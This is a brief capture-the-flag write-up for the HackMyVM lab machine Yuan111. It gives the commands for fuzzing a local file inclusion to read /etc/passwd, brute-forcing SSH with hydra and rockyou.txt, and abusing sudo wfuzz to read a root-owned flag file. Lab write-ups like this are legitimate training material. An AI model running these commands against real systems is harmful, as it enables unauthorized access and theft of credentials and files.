# URL
https://hackmyvm.eu/machines/machine.php?vm=Yuan111
# Concept
* Local file inclusion
* SSH brute forcing
* wfuzz priv esc
# Method of solve
* there is port 22 and 80 open on the server
## Initial Access
* when we do directory busting on the webserver, we see there is a weird endpoint `file.php`
* with an endpoint with that kind of name, we suspect that there is some sort of file inclusion vulnerability
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://192.168.212.37/file.php?FUZZ=/etc/passwd" -fs 0
```
* in this case, our payload lacks the typical directory escape pattern `../`
* we are able to see the `/etc/passwd` file, which has the name of a user, `tao`
* another observation is that the webpage references the `rockyou.txt` file a lot
* so we put 2 + 2 together and do an SSH bruteforce of the `tao` user with the `rockyou.txt` wordlist
```
hydra -u -l tao -P /usr/share/wordlists/rockyou.txt 192.168.212.37 -T 16 ssh
```
## Privilege Escalation
* we have sudo permissions with the `wfuzz` command
* we can use the `wfuzz` command with sudo to read any file we want to:
```
sudo wfuzz -z file,/root/root.txt -c http://localhost/FUZZ
``` 
* in this case we don't actually get a root shell, but we do privileged file read to get the root flag
